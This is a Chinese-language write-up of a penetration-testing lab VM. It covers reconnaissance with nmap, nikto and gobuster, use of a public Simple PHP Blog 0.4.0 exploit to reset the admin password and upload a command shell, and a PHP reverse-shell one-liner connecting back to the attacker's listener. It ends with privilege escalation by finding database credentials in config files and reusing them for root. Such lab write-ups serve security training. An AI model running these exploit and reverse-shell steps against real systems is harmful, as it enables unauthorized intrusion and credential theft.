vmware 环境配置时，要改为 nat 模式，且 网段设置为 10.10.10.0/24，顺便此时把 kali 也设置为 nat 模式，此靶机ip固定为10.10.10.100

# 信息搜集

1、端口探测

```bash
└─# nmap -sVC -A -p- -O 10.10.10.100
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85d32b0109427b204e30036dd18f95ff (DSA)
|   2048 307a319a1bb817e715df89920ecd5828 (RSA)
|_  256 1012644b7dff6a87372638b1449fcf5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-title: Welcome to this Site!
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.17 (Ubuntu)
MAC Address: 00:0C:29:FE:8A:7B (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、80端口探测

```bash
└─# nikto -host 10.10.10.100

+ Server: Apache/2.2.17 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /includes/: Directory indexing found.
+ /includes/: This might be interesting.
+ /info/: Output from the phpinfo() function was found.
+ /info/: This might be interesting.
+ /login/: This might be interesting.
+ /register/: This might be interesting.
+ /info.php: Output from the phpinfo() function was found.
+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Server may leak inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 06:48:10 2007. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
```

3、web目录探测

```bash
└─# gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 

/index                (Status: 200) [Size: 854]
/index.php            (Status: 200) [Size: 854]
/.html                (Status: 403) [Size: 285]
/.html.bak            (Status: 403) [Size: 289]
/blog                 (Status: 301) [Size: 311] [--> http://10.10.10.100/blog/]
/login                (Status: 200) [Size: 1174]
/login.php            (Status: 200) [Size: 1174]
/register             (Status: 200) [Size: 1562]
/register.php         (Status: 200) [Size: 1562]
/info                 (Status: 200) [Size: 49873]
/info.php             (Status: 200) [Size: 49885]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.100/includes/]
/activate             (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]
/activate.php         (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php
```

查看 `http://10.10.10.100/blog/` 源码，发现 cms 版本为 `Simple PHP Blog 0.4.0`

# web打点

紧接上文，搜索 `Simple PHP Blog 0.4.0` 有无已知漏洞

```bash
└─# searchsploit Simple PHP Blog 0.4 -m 1191
```

## 利用步骤

脚本说明：

```bash
    Program	: $0
	Version	: v0.1
	Date	: 8/25/2005
	Descript: This perl script demonstrates a few flaws in
		  SimplePHPBlog.

	Comments: THIS PoC IS FOR EDUCATIONAL PURPOSES ONLY...
		  DO NOT RUN THIS AGAINST SYSTEMS TO WHICH YOU DO
		  NOT HAVE PERMISSION TO DO SO!

		  Please see this script comments for solution/fixes
		  to demonstrated vulnerabilities.
		  http://www.simplephpblog.com

	Usage	: $0 [-h host] [-e exploit]

		-?      : this menu
		-h      : host
		-e	: exploit
			(1)	: Upload cmd.php in [site]/images/
			(2)	: Retreive Password file (hash)
			(3)	: Set New User Name and Password
				[NOTE - uppercase switches for exploits]
				-U	: user name
				-P	: password
			(4)	: Delete a System File
				-F	: Path and System File

	Examples: $0 -h 127.0.0.1 -e 2
		  $0 -h 127.0.0.1 -e 3 -U l33t -P l33t
		  $0 -h 127.0.0.1 -e 4 -F ./index.php
		  $0 -h 127.0.0.1 -e 4 -F ../../../etc/passwd
		  $0 -h 127.0.0.1 -e 1
	";

	exit;
    }
```

### 上传cmd

补充，此时Perl运行报错，解决方案 [Perl5 中的不能使用Switch，报错Can't locate Switch.pm in @INC | Linux,技术帮助分享 | 静谧星河 Blog (yuvin.cn)](https://www.yuvin.cn/Linux/519.html)

```bash
└─# perl 1191.pl -h http://10.10.10.100/blog/ -e 1

________________________________________________________________________________
		  SimplePHPBlog v0.4.0 Exploits
			     by
		     Kenneth F. Belva, CISSP
		    http://www.ftusecurity.com
________________________________________________________________________________
Running cmd.php Upload Exploit....


Retrieved Username and Password Hash: $1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
Deleted File: ./config/password.txt
./config/password.txt created!
Username is set to: a
Password is set to: a
Logged into SimplePHPBlog at: http://10.10.10.100/blog//login_cgi.php
Current Username 'a' and Password 'a'...
Created cmd.php on your local machine.
Created reset.php on your local machine.
Created cmd.php on target host: http://10.10.10.100/blog/
Created reset.php on target host: http://10.10.10.100/blog/
Removed cmd.php from your local machine.
Failed to POST 'http://10.10.10.100/blog//images/reset.php': 500 Internal Server Error at 1191.pl line 418.
Removed reset.php from your local machine.
```

<img src=".\图片\Snipaste_2023-06-25_11-22-57.png" alt="Snipaste_2023-06-25_11-22-57" style="zoom:80%;" />

### 反弹shell

```http
http://10.10.10.100/blog//images/cmd.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.144%22%2C1234%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

```
php -r '$sock=fsockopen("10.10.10.144",1234);exec("/bin/bash <&3 >&3 2>&3");'
```

```bash
┌──(root💀kali)-[~/pwnos]
└─# nc -lvvp 1234           
listening on [any] 1234 ...
connect to [10.10.10.144] from 10.10.10.100 [10.10.10.100] 34434
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@web:/var/www/blog/images$ whoami
whoami
www-data
www-data@web:/var/www/blog/images$ 
```

# 提权

1、查找靶机中关于密码的信息

```bash
find / -name "*pass*" -type  f 2>/dev/null
```

2、查找网站中关于配置文件的信息

```bash
www-data@web:/var/www/blog$ find / -name "*config*" -type  f 2>/dev/null | grep /var/www

< find / -name "*config*" -type  f 2>/dev/null | grep /var/www               
/var/www/includes/config.inc.php
/var/www/blog/scripts/sb_config.php
/var/www/blog/config/config.txt
www-data@web:/var/www/blog$ cat /var/www/blog/config/config.txt
```

3、就是一路寻找网站配置文件，看看有无数据库的账号密码，或者关键的账号密码啥的

```bash
www-data@web:/var$ cat mysqli_connect.php | grep DEFINE
cat mysqli_connect.php | grep DEFINE
DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');
```

4、尝试root用户数据库登录，可能存在 udf 提权

```bash
www-data@web:/var$ mysql -uroot -proot@ISIntS
mysql -uroot -proot@ISIntS
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.54-1ubuntu4 (Ubuntu)

Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL v2 license

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ch16               |
| mysql              |
+--------------------+
3 rows in set (0.00 sec)
```

5、直接尝试 su root

```bash
www-data@web:/var$ su
su
Password: root@ISIntS

root@web:/var# id
id
uid=0(root) gid=0(root) groups=0(root)
```

# 总结

web打点时留意当前网站 cms 的名称和版本，留意源码中的信息

提取时要搜集本机的敏感信息，如密码本，网站配置信息等，用 find 命令查找更高效
